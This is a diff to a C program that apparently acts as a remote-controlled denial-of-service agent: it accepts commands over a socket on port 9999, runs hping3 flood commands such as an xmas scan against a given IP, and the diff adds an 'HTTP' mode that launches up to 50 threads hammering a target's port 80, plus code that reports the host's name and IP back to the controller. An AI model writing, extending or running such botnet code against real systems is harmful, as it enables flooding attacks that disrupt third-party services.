@@ -3,10 +3,82 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <unistd.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include<pthread.h>
 #define MAX 10240
 #define PORT 9999
 #define SA struct sockaddr
 void resp(int s, char*, long int);
+
+void* httpthread(void* dstip)
+{
+	int sockfd, connfd;
+	struct sockaddr_in servaddr, cli;
+	char sendline[MAX];
+	char page[30];
+	char host[30];
+
+	// socket create and varification
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	if (sockfd == -1) {
+		printf("socket creation failed...\n");
+		exit(0);
+	}
+	else
+		printf("Socket successfully created..\n");
+	bzero(&servaddr, sizeof(servaddr));
+
+	// assign IP, PORT
+	servaddr.sin_family = AF_INET;
+	servaddr.sin_addr.s_addr = inet_addr((char*)dstip);
+	servaddr.sin_port = htons(80);
+
+	// connect the client socket to server socket
+	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
+		printf("connection with the server failed...\n");
+		exit(0);
+	}
+	else
+		printf("connected to the server..\n");
+
+	// function for chat
+
+	write(sockfd, "GET /\r\n", strlen("GET /\r\n"));
+	bzero(sendline,sizeof(sendline));
+	while(read(sockfd, sendline, MAX - 1) != 0){
+		fprintf(stderr, "%s", sendline);
+		bzero(sendline, MAX);
+	}
+
+	// close the socket
+	shutdown(sockfd, SHUT_RDWR); 
+
+
+	// close the socket
+	close(sockfd);
+	pthread_exit(NULL);
+}
+void httpdos(char* dstip, int count)
+{
+	pthread_t threadid[50];
+	int i=0;
+	count = count>50?50:count;
+	while(i<count)
+	{
+		pthread_create(&threadid[i], NULL, httpthread,dstip);
+		i++;
+	}
+	int k=0;
+	while(k<=i)
+	{
+		pthread_join(threadid[k++],NULL);
+	}
+}
 int execute(int s,char* cmd, char* dstip, int count)
 {
 	char statement[200];
@@ -25,10 +97,15 @@ int execute(int s,char* cmd, char* dstip, int count)
 	{
 		sprintf(statement,"hping3 %s --xmas -c %d",dstip, count);
 	}
+	else if(strcmp(cmd,"HTTP") == 0)
+	{
+		httpdos(dstip,count);
+		return;
+	}
 	else
 	{
 		sprintf(msg,"Incorrect command type passed");
-		resp(s,msg, sizeof(msg));
+		//resp(s,msg, sizeof(msg));
 		return;
 	}
 	//printf("%s,statement")
@@ -46,7 +123,7 @@ int execute(int s,char* cmd, char* dstip, int count)
 	}
 	//free(response);
 	//printf("%s",msg);
-	resp(s,msg,sizeof(msg));
+	//resp(s,msg,sizeof(msg));
 	pclose(fp);
 	//system(cmd);
 	return;
@@ -67,31 +144,38 @@ int parse(int s, char* msg)
 	int count, n =0;
 	strcpy(string, msg);
 	token = strtok(string, " ");
+	//exit(0);
 	while(token!=NULL)
 	{
-		token = strtok(NULL," ");
+		
 		switch(n)
 		{
-			case 0:
+			case 1:
 				cmd = strdup(token);
 				break;
-			case 1:
+			case 2:
 				dstip = strdup(token);
 				break;
-			case 2:
+			case 3:
 				count = atoi(token);
 				break;
 		}
+		token = strtok(NULL," ");
 		n++;
 	}
-	if(n!=4)
+	if(n==4)
 	{
-		strcpy(msg,"Incorrect argument ");
-		write(s,msg,strlen(msg));
-		return;
+		execute(s,cmd,dstip,count);
+		return 0;
 	}
 	else
-		execute(s,cmd,dstip,count);
+	{
+		strcpy(string,"Incorrect message");
+		//write(s,msg,strlen(msg));
+		//exit(0);
+		return 0;
+	}
+		
 
 }
 void resp(int s, char* msg,long int size)
@@ -109,16 +193,35 @@ void receive(int s, char*msg)
 	fclose(fp);
 	//exit(0);
 }
+
+void check_host_entry(struct hostent * hostentry) { //find host info from host name
+   if (hostentry == NULL) {
+      perror("gethostbyname");
+      exit(1);
+   }
+}
 void func(int sockfd)
 {
 	char buff[MAX];
 	char *temp = NULL;
+	char* ip;
+	struct hostent *host_entry;
 	int n=5;
 	bzero(buff,sizeof(buff));
-	sprintf(buff,"received");
+	gethostname(buff,sizeof(buff));
+	host_entry = gethostbyname(buff);
+	check_host_entry(host_entry);
+	ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));
+	//strcpy(buff,ip);
+	//exit(0);
+	//printf("%s",ip);
+	//exit(0);
 	resp(sockfd,buff,sizeof(buff));
+	bzero(buff,sizeof(buff));
+	strcpy(buff,ip);
+	resp(sockfd, ip, strlen(ip));
 	for (;;) {
-		bzero(buff, sizeof(buff));
+		//bzero(buff, sizeof(buff));
 		/*printf("Enter the string : ");
 		n = 0;
 		while ((buff[n++] = getchar()) != '\n')
